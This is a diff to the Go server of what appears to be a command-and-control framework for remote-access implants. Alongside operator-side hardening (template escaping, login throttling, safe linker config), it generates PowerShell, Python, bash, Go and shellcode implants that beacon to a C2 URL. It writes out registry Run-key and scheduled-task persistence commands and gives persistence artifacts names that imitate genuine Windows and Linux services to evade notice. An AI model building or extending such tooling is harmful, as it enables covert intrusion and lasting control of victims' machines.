 		ClientID string `json:"client_id" binding:"required"`
@@ -1013,6 +1354,7 @@ func handleQuickCommand(c *gin.Context) {
 		"port_scan":      "__PORTSCAN__",
 		"reg_persist":    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v PrtsAgent /t REG_SZ /d C:\\ProgramData\\prts.exe /f",
 		"task_persist":   "schtasks /create /sc minute /mo 30 /tn PrtsUpdate /tr C:\\ProgramData\\prts.exe /f",
+		"uninstall":      "__UNINSTALL__",
 		"wmi_persist":    "__WMI_PERSIST__",
 		"socks5":         "__SOCKS5__",
 		"port_fwd":       "__PORT_FORWARD__",
@@ -1069,6 +1411,12 @@ func handleCreateListener(c *gin.Context) {
 		BindIP: req.BindIP,
 		Port:   req.Port,
 		Status: "stopped",
+		NodeID: localNodeID(),
+	}
+
+	if err := db.Create(l).Error; err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "LISTENER_CREATE_FAILED"})
+		return
 	}
 
 	if err := l.Start(); err != nil {
@@ -1091,16 +1439,33 @@ func handleStartListener(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "ALREADY_RUNNING"})
 		return
 	}
+	// Cluster: listeners bind ports on their owning node only.
+	if listener.NodeID != "" && listener.NodeID != localNodeID() {
+		emitClusterEvent("listener_start", map[string]string{"listener_id": listener.ID}, listener.NodeID)
+		addLog("CLUSTER", fmt.Sprintf("LISTENER_START_FORWARDED: %s -> node %s", listener.Name, listener.NodeID))
+		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_START_FORWARDED"})
+		return
+	}
 	if err := listener.Start(); err != nil {
 		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 		return
 	}
+	emitClusterEvent("listener_update", listener, "")
 	addLog("NET", fmt.Sprintf("LISTENER_STARTED: %s", listener.Name))
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_STARTED", Data: listener})
 }
 
 func handleStopListener(c *gin.Context) {
 	id := c.Param("id")
+
+	var listener Listener
+	if err := db.First(&listener, "id = ?", id).Error; err == nil && listener.NodeID != "" && listener.NodeID != localNodeID() {
+		emitClusterEvent("listener_stop", map[string]string{"listener_id": listener.ID}, listener.NodeID)
+		addLog("CLUSTER", fmt.Sprintf("LISTENER_STOP_FORWARDED: %s -> node %s", listener.Name, listener.NodeID))
+		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_STOP_FORWARDED"})
+		return
+
+	}
 
 	alMutex.Lock()
 	l, exists := activeListeners[id]
@@ -1116,6 +1481,7 @@ func handleStopListener(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 		return
 	}
+	emitClusterEvent("listener_update", *l, "")
 	addLog("NET", fmt.Sprintf("LISTENER_STOPPED: %s", l.Name))
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_STOPPED"})
 }
@@ -1256,7 +1622,16 @@ func handleGetStats(c *gin.Context) {
 // ══════════════════════════════════════════════════════════
 
 func handleSaveSettings(c *gin.Context) {
-	var req Settings
+	// Explicit DTO: binding the model would let the client set its own ID and
+	// create extra settings rows.
+	var req struct {
+		ServerName       string `json:"server_name"`
+		SessionTimeout   int    `json:"session_timeout"`
+		Theme            string `json:"theme"`
+		Debug            bool   `json:"debug"`
+		GeoIPLookup      bool   `json:"geoip_lookup"`
+		LegacyBeaconAuth bool   `json:"legacy_beacon_auth"`
+	}
 	if err := c.ShouldBindJSON(&req); err != nil {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
 		return
@@ -1273,7 +1648,14 @@ func handleSaveSettings(c *gin.Context) {
 	var settings Settings
 	if err := db.First(&settings).Error; err != nil {
 		// If no settings exist, create new
-		settings = req
+		settings = Settings{
+			ServerName:       req.ServerName,
+			SessionTimeout:   req.SessionTimeout,
+			Theme:            req.Theme,
+			Debug:            req.Debug,
+			GeoIPLookup:      req.GeoIPLookup,
+			LegacyBeaconAuth: req.LegacyBeaconAuth,
+		}
 		if err := db.Create(&settings).Error; err != nil {
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "SETTINGS_SAVE_FAILED"})
 			return
@@ -1284,6 +1666,8 @@ func handleSaveSettings(c *gin.Context) {
 		settings.SessionTimeout = req.SessionTimeout
 		settings.Theme = req.Theme
 		settings.Debug = req.Debug
+		settings.GeoIPLookup = req.GeoIPLookup
+		settings.LegacyBeaconAuth = req.LegacyBeaconAuth
 		if err := db.Save(&settings).Error; err != nil {
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "SETTINGS_SAVE_FAILED"})
 			return
@@ -1372,28 +1756,90 @@ func handleDeletePayload(c *gin.Context) {
 		return
 	}
 
-	// Remove file
-	filePath := "." + payload.DownloadURL
-	os.Remove(filePath)
+	// Remove file. DownloadURL is server-generated ("/static/payloads/x.ext"),
+	// but never os.Remove an unvalidated path.
+	if payload.DownloadURL != "" {
+		rel := strings.TrimPrefix(payload.DownloadURL, "/static/")
+		rel = strings.TrimPrefix(rel, "/")
+		rel = filepath.Clean(rel)
+		if rel != "." && rel != ".." && !strings.HasPrefix(rel, ".."+string(filepath.Separator)) && !filepath.IsAbs(rel) {
+			payloadsRoot, _ := filepath.Abs("./static/payloads")
+			target := filepath.Join(payloadsRoot, rel)
+			if target == payloadsRoot || strings.HasPrefix(target, payloadsRoot+string(filepath.Separator)) {
+				os.Remove(target)
+			}
+		}
+	}
 
 	db.Delete(&Payload{}, "id = ?", id)
 	addLog("GEN", "PAYLOAD_DELETED: "+id)
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "PAYLOAD_DELETED"})
 }
 
+// implantConfig is the complete runtime configuration injected into a payload.
+// For Go implants it is written into implants/beacon_config.json via
+// `go build -overlay` (never through the command line); for script payloads it
+// is substituted into template placeholders after escaping.
+type implantConfig struct {
+	C2URL         string `json:"c2_url"`
+	BeaconID      string `json:"beacon_id"`
+	Sleep         int    `json:"sleep"`
+	Jitter        int    `json:"jitter"`
+	Proto         string `json:"proto"`
+	AllowedIPs    string `json:"allowed_ips"` // pipe-separated IPs/CIDRs
+	BlockedIPs    string `json:"blocked_ips"` // pipe-separated IPs/CIDRs
+	BeaconKey     string `json:"beacon_key"`  // per-payload HMAC key (hex)
+	PersistMethod string `json:"persist_method"`
+	PersistName   string `json:"persist_name"`
+}
+
+// persistMethodsForOS lists the accepted persistence method values.
+func persistMethodsForOS(goos string) []string {
+	switch goos {
+	case "windows":
+		return []string{"", "auto", "run", "startup", "schtasks", "none"}
+	case "darwin":
+		return []string{"", "auto", "launchagent", "none"}
+	default:
+		return []string{"", "auto", "cron", "systemd", "profile", "none"}
+	}
+}
+
+// validateIPFilterList verifies every pipe/comma separated entry is an IP or CIDR.
+func validateIPFilterList(entries string) bool {
+	if strings.TrimSpace(entries) == "" {
+		return true
+	}
+	for _, entry := range strings.Split(entries, "|") {
+		entry = strings.TrimSpace(entry)
+		if entry == "" {
+			continue
+		}
+		if strings.Contains(entry, "/") {
+			if _, _, err := net.ParseCIDR(entry); err != nil {
+				return false
+			}
+		} else if net.ParseIP(entry) == nil {
+			return false
+		}
+	}
+	return true
+}
+
 func handleGeneratePayload(c *gin.Context) {
 	var req struct {
-		Name         string `json:"name" binding:"required"`
-		Type         string `json:"type" binding:"required"`
-		ListenerID   string `json:"listener_id" binding:"required"`
-		CallbackHost string `json:"callback_host" binding:"required"`
-		CallbackPort int    `json:"callback_port"`
-		OS           string `json:"os"`
-		Arch         string `json:"arch"`
-		Sleep        int    `json:"sleep"`
-		Jitter       *int   `json:"jitter"`
-		AllowedIPs   string `json:"allowed_ips"`
-		BlockedIPs   string `json:"blocked_ips"`
+		Name          string `json:"name" binding:"required"`
+		Type          string `json:"type" binding:"required"`
+		ListenerID    string `json:"listener_id" binding:"required"`
+		CallbackHost  string `json:"callback_host" binding:"required"`
+		CallbackPort  int    `json:"callback_port"`
+		OS            string `json:"os"`
+		Arch          string `json:"arch"`
+		Sleep         int    `json:"sleep"`
+		Jitter        *int   `json:"jitter"`
+		AllowedIPs    string `json:"allowed_ips"`
+		BlockedIPs    string `json:"blocked_ips"`
+		PersistMethod string `json:"persist_method"`
 	}
 
 	if err := c.ShouldBindJSON(&req); err != nil {
@@ -1438,12 +1884,20 @@ func handleGeneratePayload(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_JITTER"})
 		return
 	}
+	if sleepVal < 1 || sleepVal > 86400 {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_SLEEP"})
+		return
+	}
 
 	if req.OS == "" {
 		req.OS = "windows"
 	}
 	if req.Arch == "" {
 		req.Arch = "amd64"
+	}
+	if req.OS != "windows" && req.OS != "linux" && req.OS != "darwin" {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_OS"})
+		return
 	}
 
 	// Force OS for platform-specific types
@@ -1454,12 +1908,64 @@ func handleGeneratePayload(c *gin.Context) {
 		req.OS = "linux"
 	}
 
-	newID := "P-" + uuid.New().String()[:8]
-	beaconID := uuid.New().String()
-
-	// Prepare IP filter values (use | separator for ldflags compatibility)
+	// Validate IP filter input before it reaches any template or build config.
 	allowedIPs := strings.ReplaceAll(strings.TrimSpace(req.AllowedIPs), ",", "|")
 	blockedIPs := strings.ReplaceAll(strings.TrimSpace(req.BlockedIPs), ",", "|")
+	if !validateIPFilterList(allowedIPs) || !validateIPFilterList(blockedIPs) {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_IP_FILTER"})
+		return
+	}
+
+	// Persistence method (Go implants only; scripts are short-lived by design)
+	persistMethod := strings.TrimSpace(req.PersistMethod)
+	validPersist := false
+	for _, m := range persistMethodsForOS(req.OS) {
+		if persistMethod == m {
+			validPersist = true
+			break
+		}
+	}
+	if !validPersist {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_PERSIST_METHOD"})
+		return
+	}
+
+	newID := "P-" + uuid.New().String()[:8]
+	beaconID := uuid.New().String()
+	beaconKey := randomHexKey(32)
+
+	// Randomize the persistence artifact name per payload (platform-appropriate)
+	persistKey := ""
+	if persistMethod != "none" {
+		if req.OS == "windows" {
+			persistNames := []string{
+				"WindowsUpdateSvc", "SecurityHealthSystray", "OneDriveSync",
+				"MicrosoftEdgeUpdate", "WindowsDefenderTask", "RuntimeBroker",
+				"BackgroundTaskHost", "SearchIndexer", "WinStoreApp",
+				"SystemSettings", "DesktopWindowMgr", "AppHostSvc",
+			}
+			persistKey = persistNames[time.Now().UnixNano()%int64(len(persistNames))]
+		} else {
+			unixNames := []string{
+				"user-dirs-update", "spice-vdagent", "gvfs-udisks2",
+				"gnome-keyring-seed", "at-spi-registry", "dbus-user-session",
+			}
+			persistKey = unixNames[time.Now().UnixNano()%int64(len(unixNames))]
+		}
+	}
+
+	cfg := implantConfig{
+		C2URL:         c2URL,
+		BeaconID:      beaconID,
+		Sleep:         sleepVal,
+		Jitter:        jitterVal,
+		Proto:         proto,
+		AllowedIPs:    allowedIPs,
+		BlockedIPs:    blockedIPs,
+		BeaconKey:     beaconKey,
+		PersistMethod: persistMethod,
+		PersistName:   persistKey,
+	}
 
 	// Determine file extension
 	ext := ""
@@ -1491,8 +1997,9 @@ func handleGeneratePayload(c *gin.Context) {
 	}
 
 	dstDir := "./static/payloads"
-	if _, err := os.Stat(dstDir); os.IsNotExist(err) {
-		os.MkdirAll(dstDir, 0755)
+	if err := os.MkdirAll(dstDir, 0755); err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "PAYLOAD_DIR_FAILED"})
+		return
 	}
 	dstFile := filepath.Join(dstDir, fmt.Sprintf("%s.%s", newID, ext))
 
@@ -1504,14 +2011,14 @@ func handleGeneratePayload(c *gin.Context) {
 			c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "PowerShell stager does not support TCP protocol. Use HTTP listener."})
 			return
 		}
-		if err := generateFromTemplate("implants/beacon.ps1", dstFile, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
+		if err := generateFromTemplate("implants/beacon.ps1", dstFile, cfg); err != nil {
 			addLog("ERR", "PS1_GEN_FAILED: "+err.Error())
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 			return
 		}
 
 	case "python":
-		if err := generateFromTemplate("implants/beacon.py", dstFile, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
+		if err := generateFromTemplate("implants/beacon.py", dstFile, cfg); err != nil {
 			addLog("ERR", "PYTHON_GEN_FAILED: "+err.Error())
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 			return
@@ -1520,14 +2027,15 @@ func handleGeneratePayload(c *gin.Context) {
 	case "bash":
 		// Bash payloads generate a fresh ID at process startup. Reusing a
 		// build-time ID would merge every instance of one script into one beacon.
-		if err := generateFromTemplate("implants/beacon.sh", dstFile, c2URL, "", sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
+		cfg.BeaconID = ""
+		if err := generateFromTemplate("implants/beacon.sh", dstFile, cfg); err != nil {
 			addLog("ERR", "BASH_GEN_FAILED: "+err.Error())
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 			return
 		}
 
 	case "executable":
-		if err := buildGoImplant(dstFile, req.OS, req.Arch, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
+		if err := buildGoImplant(dstFile, req.OS, req.Arch, cfg); err != nil {
 			addLog("ERR", "BUILD_FAILED: "+err.Error())
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 			return
@@ -1541,7 +2049,7 @@ func handleGeneratePayload(c *gin.Context) {
 		}
 		tmpFileSC := filepath.Join(dstDir, fmt.Sprintf("%s_tmp%s", newID, tmpExtSC))
 
-		if err := buildGoImplant(tmpFileSC, req.OS, req.Arch, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
+		if err := buildGoImplant(tmpFileSC, req.OS, req.Arch, cfg); err != nil {
 			addLog("ERR", "SHELLCODE_BUILD_FAILED: "+err.Error())
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 			return
@@ -1569,7 +2077,7 @@ func handleGeneratePayload(c *gin.Context) {
 		}
 		tmpFileEmbed := filepath.Join(dstDir, fmt.Sprintf("%s_tmp%s", newID, tmpExtEmbed))
 
-		if err := buildGoImplant(tmpFileEmbed, req.OS, req.Arch, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
+		if err := buildGoImplant(tmpFileEmbed, req.OS, req.Arch, cfg); err != nil {
 			addLog("ERR", "SHELLCODE_EMBED_BUILD_FAILED: "+err.Error())
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 			return
@@ -1622,6 +2130,7 @@ func handleGeneratePayload(c *gin.Context) {
 		ListenerID:  req.ListenerID,
 		CreatedAt:   time.Now(),
 		DownloadURL: "/static/payloads/" + newID + "." + ext,
+		BeaconKey:   beaconKey,
 	}
 
 	if err := db.Create(p).Error; err != nil {
@@ -1633,51 +2142,103 @@ func handleGeneratePayload(c *gin.Context) {
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "ARTIFACT_GENERATED", Data: p})
 }
 
-// generateFromTemplate reads a template file and replaces placeholders
-func generateFromTemplate(tmplPath, dstFile, c2URL, beaconID string, sleep, jitter int, proto, allowedIPs, blockedIPs string) error {
+// ── Template value escaping ──────────────────────────────
+//
+// Operator-supplied values are interpolated into quoted strings inside the
+// generated scripts. Without escaping, a value like `$(calc.exe)` would
+// execute on the target when the script is loaded.
+
+func escapePS1DoubleQuoted(s string) string {
+	r := strings.NewReplacer(
+		"`", "``",
+		"\"", "\\\"",
+		"$", "`$",
+	)
+	return r.Replace(s)
+}
+
+func escapeShDoubleQuoted(s string) string {
+	r := strings.NewReplacer(
+		"\\", "\\\\",
+		"\"", "\\\"",
+		"$", "\\$",
+		"`", "\\`",
+	)
+	return r.Replace(s)
+}
+
+func escapePyDoubleQuoted(s string) string {
+	r := strings.NewReplacer(
+		"\\", "\\\\",
+		"\"", "\\\"",
+	)
+	return r.Replace(s)
+}
+
+// generateFromTemplate reads a template file and substitutes the implant
+// configuration, escaping values according to the template language.
+func generateFromTemplate(tmplPath, dstFile string, cfg implantConfig) error {
 	content, err := os.ReadFile(tmplPath)
 	if err != nil {
 		return fmt.Errorf("TEMPLATE_NOT_FOUND: %s", tmplPath)
 	}
 	script := string(content)
-	script = strings.ReplaceAll(script, "{{C2_URL}}", c2URL)
-	script = strings.ReplaceAll(script, "{{BEACON_ID}}", beaconID)
-	script = strings.ReplaceAll(script, "{{SLEEP}}", strconv.Itoa(sleep))
-	script = strings.ReplaceAll(script, "{{JITTER}}", strconv.Itoa(jitter))
-	script = strings.ReplaceAll(script, "{{PROTO}}", proto)
-	script = strings.ReplaceAll(script, "{{ALLOWED_IPS}}", allowedIPs)
-	script = strings.ReplaceAll(script, "{{BLOCKED_IPS}}", blockedIPs)
+
+	var esc func(string) string
+	switch {
+	case strings.HasSuffix(tmplPath, ".ps1"):
+		esc = escapePS1DoubleQuoted
+	case strings.HasSuffix(tmplPath, ".sh"):
+		esc = escapeShDoubleQuoted
+	default:
+		esc = escapePyDoubleQuoted
+	}
+
+	script = strings.ReplaceAll(script, "{{C2_URL}}", esc(cfg.C2URL))
+	script = strings.ReplaceAll(script, "{{BEACON_ID}}", esc(cfg.BeaconID))
+	script = strings.ReplaceAll(script, "{{BEACON_KEY}}", esc(cfg.BeaconKey))
+	script = strings.ReplaceAll(script, "{{SLEEP}}", strconv.Itoa(cfg.Sleep))
+	script = strings.ReplaceAll(script, "{{JITTER}}", strconv.Itoa(cfg.Jitter))
+	script = strings.ReplaceAll(script, "{{PROTO}}", esc(cfg.Proto))
+	script = strings.ReplaceAll(script, "{{ALLOWED_IPS}}", esc(cfg.AllowedIPs))
+	script = strings.ReplaceAll(script, "{{BLOCKED_IPS}}", esc(cfg.BlockedIPs))
 	return os.WriteFile(dstFile, []byte(script), 0644)
 }
 
-// buildGoImplant compiles the Go implant for the specified OS/Arch
-func buildGoImplant(dstFile, targetOS, targetArch, c2URL, beaconID string, sleep, jitter int, proto, allowedIPs, blockedIPs string) error {
+// buildGoImplant compiles the Go implant for the specified OS/Arch.
+// The entire runtime configuration is serialized to JSON, base64-encoded and
+// injected with a single `-X main.cfgB64=...` linker variable. Base64's
+// alphabet contains no whitespace or quotes, so user-controlled values can
+// never inject additional linker flags (the old per-value -X interpolation
+// allowed exactly that, e.g. via -extld, achieving code execution on the C2).
+func buildGoImplant(dstFile, targetOS, targetArch string, cfg implantConfig) error {
 	srcDir := "implants"
 	if _, err := os.Stat(filepath.Join(srcDir, "main.go")); os.IsNotExist(err) {
 		return fmt.Errorf("SOURCE_NOT_FOUND")
 	}
 
-	absDst, _ := filepath.Abs(dstFile)
+	absDst, err := filepath.Abs(dstFile)
+	if err != nil {
+		return fmt.Errorf("DST_PATH_FAILED: %v", err)
+	}
 
-	// Build ldflags: strip symbols + inject config
-	// -H windowsgui: Windows GUI subsystem (no console window)
+	cfgJSON, err := json.Marshal(cfg)
+	if err != nil {
+		return fmt.Errorf("CONFIG_MARSHAL_FAILED: %v", err)
+	}
+
+	// Static ldflags only (symbols stripped, no console window on Windows)
+	// plus the injection-safe base64 config blob.
 	ldflagsBase := "-s -w -buildid="
 	if targetOS == "windows" || (targetOS == "" && runtime.GOOS == "windows") {
 		ldflagsBase = "-s -w -buildid= -H windowsgui"
 	}
-	// Randomize Windows persist registry key name
-	persistNames := []string{
-		"WindowsUpdateSvc", "SecurityHealthSystray", "OneDriveSync",
-		"MicrosoftEdgeUpdate", "WindowsDefenderTask", "RuntimeBroker",
-		"BackgroundTaskHost", "SearchIndexer", "WinStoreApp",
-		"SystemSettings", "DesktopWindowMgr", "AppHostSvc",
-	}
-	persistKey := persistNames[time.Now().UnixNano()%int64(len(persistNames))]
+	ldflags := ldflagsBase + " -X main.cfgB64=" + base64.StdEncoding.EncodeToString(cfgJSON)
 
-	ldflags := fmt.Sprintf("%s -X main.C2_URL=%s -X main.BEACON_ID=%s -X main.SLEEP_INTERVAL=%d -X main.JITTER=%d -X main.PROTO=%s -X main.ALLOWED_IPS=%s -X main.BLOCKED_IPS=%s -X main.persistName=%s",
-		ldflagsBase, c2URL, beaconID, sleep, jitter, proto, allowedIPs, blockedIPs, persistKey)
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
+	defer cancel()
 
-	cmd := exec.Command("go", "build",
+	cmd := exec.CommandContext(ctx, "go", "build",
 		"-trimpath",
 		"-buildvcs=false",
 		"-ldflags", ldflags,
@@ -1695,6 +2256,9 @@ func buildGoImplant(dstFile, targetOS, targetArch, c2URL, beaconID string, sleep
 
 	output, err := cmd.CombinedOutput()
 	if err != nil {
+		if ctx.Err() == context.DeadlineExceeded {
+			return fmt.Errorf("BUILD_TIMEOUT")
+		}
 		return fmt.Errorf("BUILD_FAILED: %s", string(output))
 	}
 
@@ -2514,14 +3078,23 @@ func handleLogin(c *gin.Context) {
 	username := c.PostForm("username")
 	password := c.PostForm("password")
 
+	throttleKey := loginKey(c.ClientIP(), username)
+	if loginLocked(throttleKey) {
+		addLog("SEC", fmt.Sprintf("LOGIN_THROTTLED: %s from %s", username, c.ClientIP()))
+		c.JSON(http.StatusTooManyRequests, APIResponse{Status: "error", Message: "TOO_MANY_ATTEMPTS"})
+		return
+	}
+
 	var user User
 	if err := db.Where("username = ?", username).First(&user).Error; err == nil {
 		valid, needsUpgrade := verifyPassword(user.Password, password)
 		if !valid {
+			loginRecordFailure(throttleKey)
 			addLog("SEC", fmt.Sprintf("LOGIN_FAILED: %s from %s", username, c.ClientIP()))
 			c.JSON(http.StatusUnauthorized, APIResponse{Status: "error", Message: "CREDENTIALS_REJECTED"})
 			return
 		}
+		loginRecordSuccess(throttleKey)
 		if needsUpgrade {
 			if passwordHash, hashErr := hashPassword(password); hashErr == nil {
 				db.Model(&user).Update("password", passwordHash)
@@ -2536,6 +3109,13 @@ func handleLogin(c *gin.Context) {
 		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "AUTHENTICATED"})
 		return
 	}
+	// Uniform failure response for unknown users; still burn a bcrypt hash
+	// comparison so user enumeration via timing is harder.
+	if valid, _ := verifyPassword("$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy", password); !valid {
+		// always false; keeps timing uniform with the known-user path
+		_ = valid
+	}
+	loginRecordFailure(throttleKey)
 	addLog("SEC", fmt.Sprintf("LOGIN_FAILED: %s from %s", username, c.ClientIP()))
 	c.JSON(http.StatusUnauthorized, APIResponse{Status: "error", Message: "CREDENTIALS_REJECTED"})
 }
@@ -2602,19 +3182,34 @@ func handleWS(c *gin.Context) {
 	}
 	conn.SetReadLimit(1 << 20)
 
-	wsMutex.Lock()
-	wsClients[conn] = true
-	for _, l := range logs {
-		conn.WriteMessage(websocket.TextMessage, []byte(l))
+	client := &wsClient{
+		conn: conn,
+		send: make(chan string, 256),
 	}
+
+	// Replay recent logs before registering the client so the initial burst
+	// is ordered; the buffer (256) covers the 200-entry ring.
+	wsMutex.Lock()
+	for _, l := range logs {
+		client.send <- l
+	}
+	wsClients[client] = true
 	wsMutex.Unlock()
 
-	defer func() {
-		wsMutex.Lock()
-		delete(wsClients, conn)
-		wsMutex.Unlock()
-		conn.Close()
+	// Dedicated writer goroutine with per-write deadline: a stuck client can
+	// never block the broadcast path or other clients.
+	go func() {
+		for msg := range client.send {
+			conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+			if err := conn.WriteMessage(websocket.TextMessage, []byte(msg)); err != nil {
+				client.shutdown()
+				return
+			}
+		}
+		client.shutdown()
 	}()
+
+	defer client.shutdown()
 
 	for {
 		_, msg, err := conn.ReadMessage()
@@ -2738,7 +3333,15 @@ func handleFMList(c *gin.Context) {
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 			return
 		}
-		info, _ = os.Stat(absPath)
+		if err := os.MkdirAll(absPath, 0755); err != nil {
+			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
+			return
+		}
+		info, err = os.Stat(absPath)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "STAT_FAILED: " + err.Error()})
+			return
+		}
 	}
 
 	if !info.IsDir() {
@@ -2998,7 +3601,8 @@ func handleFMUploadInit(c *gin.Context) {
 	})
 }
 
-// handleFMUploadChunk receives a single chunk
+// handleFMUploadChunk receives a single chunk. Locking is per session so
+// concurrent uploads of different files never serialize behind one another.
 func handleFMUploadChunk(c *gin.Context) {
 	c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, maxManagedUploadSize+1<<20)
 	uploadID := c.Param("upload_id")
@@ -3032,11 +3636,9 @@ func handleFMUploadChunk(c *gin.Context) {
 		return
 	}
 
-	// Reserve the chunk's bytes while holding the session lock so duplicate
-	// uploads cannot make temporary storage exceed the declared total size.
-	uploadSessionsMu.Lock()
+	session.mu.Lock()
 	if session.Completed {
-		uploadSessionsMu.Unlock()
+		session.mu.Unlock()
 		c.JSON(http.StatusConflict, APIResponse{Status: "error", Message: "UPLOAD_ALREADY_COMPLETING"})
 		return
 	}
@@ -3046,13 +3648,13 @@ func handleFMUploadChunk(c *gin.Context) {
 	previousSize := session.ChunkSizes[chunkIndex]
 	projectedSize := session.ReceivedBytes - previousSize + file.Size
 	if projectedSize > session.TotalSize {
-		uploadSessionsMu.Unlock()
+		session.mu.Unlock()
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "UPLOAD_EXCEEDS_TOTAL_SIZE"})
 		return
 	}
 	chunkPath := filepath.Join(session.TempDir, fmt.Sprintf("chunk_%06d", chunkIndex))
 	if err := c.SaveUploadedFile(file, chunkPath); err != nil {
-		uploadSessionsMu.Unlock()
+		session.mu.Unlock()
 		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "CHUNK_SAVE_FAILED: " + err.Error()})
 		return
 	}
@@ -3060,7 +3662,7 @@ func handleFMUploadChunk(c *gin.Context) {
 	session.ReceivedBytes = projectedSize
 	session.Received[chunkIndex] = true
 	received := len(session.Received)
-	uploadSessionsMu.Unlock()
+	session.mu.Unlock()
 
 	c.JSON(http.StatusOK, APIResponse{
 		Status: "success",
@@ -3072,7 +3674,9 @@ func handleFMUploadChunk(c *gin.Context) {
 	})
 }
 
-// handleFMUploadComplete merges chunks into final file
+// handleFMUploadComplete merges chunks into the final file. Chunks are
+// streamed with io.Copy instead of being read into memory, so even a 512MB
+// upload completes with constant memory usage.
 func handleFMUploadComplete(c *gin.Context) {
 	uploadID := c.Param("upload_id")
 	claimed := false
@@ -3085,11 +3689,16 @@ func handleFMUploadComplete(c *gin.Context) {
 		c.JSON(http.StatusConflict, APIResponse{Status: "error", Message: "UPLOAD_ALREADY_COMPLETING"})
 		return
 	}
+	session.mu.Lock()
 	if exists && len(session.Received) == session.TotalChunks {
 		session.Completed = true
 		claimed = true
 	}
+	totalChunks := session.TotalChunks
+	tempDir := session.TempDir
+	session.mu.Unlock()
 	uploadSessionsMu.Unlock()
+
 	if claimed {
 		defer func() {
 			if completed {
@@ -3097,7 +3706,9 @@ func handleFMUploadComplete(c *gin.Context) {
 			}
 			uploadSessionsMu.Lock()
 			if current, ok := uploadSessions[uploadID]; ok && current == session {
+				current.mu.Lock()
 				current.Completed = false
+				current.mu.Unlock()
 			}
 			uploadSessionsMu.Unlock()
 		}()
@@ -3109,13 +3720,13 @@ func handleFMUploadComplete(c *gin.Context) {
 	}
 
 	// Verify all chunks received
-	uploadSessionsMu.Lock()
+	session.mu.Lock()
 	receivedChunks := len(session.Received)
-	uploadSessionsMu.Unlock()
-	if receivedChunks != session.TotalChunks {
+	session.mu.Unlock()
+	if receivedChunks != totalChunks {
 		c.JSON(http.StatusBadRequest, APIResponse{
 			Status:  "error",
-			Message: fmt.Sprintf("INCOMPLETE: %d/%d chunks received", receivedChunks, session.TotalChunks),
+			Message: fmt.Sprintf("INCOMPLETE: %d/%d chunks received", receivedChunks, totalChunks),
 		})
 		return
 	}
@@ -3133,28 +3744,35 @@ func handleFMUploadComplete(c *gin.Context) {
 		return
 	}
 
-	// Merge chunks
+	// Merge chunks (streamed)
 	outFile, err := os.Create(finalPath)
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "CREATE_FAILED: " + err.Error()})
 		return
 	}
-	defer outFile.Close()
-
-	for i := 0; i < session.TotalChunks; i++ {
-		chunkPath := filepath.Join(session.TempDir, fmt.Sprintf("chunk_%06d", i))
-		chunkData, err := os.ReadFile(chunkPath)
+	mergeFailed := false
+	for i := 0; i < totalChunks && !mergeFailed; i++ {
+		chunkPath := filepath.Join(tempDir, fmt.Sprintf("chunk_%06d", i))
+		chunkFile, err := os.Open(chunkPath)
 		if err != nil {
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: fmt.Sprintf("CHUNK_READ_FAILED: chunk %d", i)})
-			return
+			mergeFailed = true
+			break
 		}
-		if _, err := outFile.Write(chunkData); err != nil {
-			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "WRITE_FAILED: " + err.Error()})
-			return
+		_, copyErr := io.Copy(outFile, chunkFile)
+		chunkFile.Close()
+		if copyErr != nil {
